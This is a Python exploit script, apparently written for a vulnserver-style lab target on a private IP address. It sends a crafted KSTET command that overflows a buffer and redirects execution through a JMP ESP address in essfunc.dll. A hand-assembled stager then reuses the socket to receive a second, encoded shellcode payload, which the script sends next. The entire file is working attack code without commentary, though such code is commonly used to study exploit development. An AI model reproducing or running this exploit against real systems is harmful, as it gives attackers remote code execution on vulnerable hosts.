import socket
import os
import sys
import time

host = '192.168.1.15'
port = 9999

# call to recv is at 0x00401953
# recv is at 0x0040254C
# socket descriptor is at 0x00b7fb94

# Junk buffer
junk = '\x90' * 7

dumbshit = '\x83\xEC\x70'
dumbshit += '\x52'
dumbshit += '\x80\xC6\x02'
dumbshit += '\x52'
dumbshit += '\x54'
dumbshit += '\x5A'
dumbshit += '\x83\xC2\x70'
dumbshit += '\x80\xEA\x04'
dumbshit += '\x52'
dumbshit += '\x83\xC0\x64'
dumbshit += '\x83\xC0\x64'
dumbshit += '\x83\xC0\x64'
dumbshit += '\x83\xC0\x64'
dumbshit += '\x83\xC0\x48'
dumbshit += '\xFF\x30'
dumbshit += '\xB8\x90\x2C\x25\x40'
dumbshit += '\xC1\xE8\x08'
dumbshit += '\xFF\xD0'

junk += dumbshit

junk += '\x90' * (70 - 7 - len(dumbshit))

# JMP ESP address within essfunc.dll
junk += '\xaf\x11\x50\x62'

# JMP SHORT -70
junk += '\xeb\xb8\x90\x90'

junk += '\x90' * (500 - len(junk))

sploit = 'KSTET ' + junk

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(sploit)
time.sleep(30)

buf =  ""
buf += "\xb8\x07\x9f\x2a\xf3\xdb\xcc\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x31\x47\x12\x83\xef\xfc\x03\x40\x91\xc8"
buf += "\x06\xb2\x45\x8e\xe9\x4a\x96\xef\x60\xaf\xa7\x2f\x16"
buf += "\xa4\x98\x9f\x5c\xe8\x14\x6b\x30\x18\xae\x19\x9d\x2f"
buf += "\x07\x97\xfb\x1e\x98\x84\x38\x01\x1a\xd7\x6c\xe1\x23"
buf += "\x18\x61\xe0\x64\x45\x88\xb0\x3d\x01\x3f\x24\x49\x5f"
buf += "\xfc\xcf\x01\x71\x84\x2c\xd1\x70\xa5\xe3\x69\x2b\x65"
buf += "\x02\xbd\x47\x2c\x1c\xa2\x62\xe6\x97\x10\x18\xf9\x71"
buf += "\x69\xe1\x56\xbc\x45\x10\xa6\xf9\x62\xcb\xdd\xf3\x90"
buf += "\x76\xe6\xc0\xeb\xac\x63\xd2\x4c\x26\xd3\x3e\x6c\xeb"
buf += "\x82\xb5\x62\x40\xc0\x91\x66\x57\x05\xaa\x93\xdc\xa8"
buf += "\x7c\x12\xa6\x8e\x58\x7e\x7c\xae\xf9\xda\xd3\xcf\x19"
buf += "\x85\x8c\x75\x52\x28\xd8\x07\x39\x25\x2d\x2a\xc1\xb5"
buf += "\x39\x3d\xb2\x87\xe6\x95\x5c\xa4\x6f\x30\x9b\xcb\x45"
buf += "\x84\x33\x32\x66\xf5\x1a\xf1\x32\xa5\x34\xd0\x3a\x2e"
buf += "\xc4\xdd\xee\xe1\x94\x71\x41\x42\x44\x32\x31\x2a\x8e"
buf += "\xbd\x6e\x4a\xb1\x17\x07\xe1\x48\xf0\xe8\x5e\x53\x07"
buf += "\x81\x9c\x53\x06\xea\x28\xb5\x62\x1c\x7d\x6e\x1b\x85"
buf += "\x24\xe4\xba\x4a\xf3\x81\xfd\xc1\xf0\x76\xb3\x21\x7c"
buf += "\x64\x24\xc2\xcb\xd6\xe3\xdd\xe1\x7e\x6f\x4f\x6e\x7e"
buf += "\xe6\x6c\x39\x29\xaf\x43\x30\xbf\x5d\xfd\xea\xdd\x9f"
buf += "\x9b\xd5\x65\x44\x58\xdb\x64\x09\xe4\xff\x76\xd7\xe5"
buf += "\xbb\x22\x87\xb3\x15\x9c\x61\x6a\xd4\x76\x38\xc1\xbe"
buf += "\x1e\xbd\x29\x01\x58\xc2\x67\xf7\x84\x73\xde\x4e\xbb"
buf += "\xbc\xb6\x46\xc4\xa0\x26\xa8\x1f\x61\x58\x58\xad\x7c"
buf += "\xcd\xc3\x44\x3d\x93\xf3\xb3\x02\xaa\x77\x31\xfb\x49"
buf += "\x67\x30\xfe\x16\x2f\xa9\x72\x06\xda\xcd\x21\x27\xcf"

expl.send(buf)

expl.close()
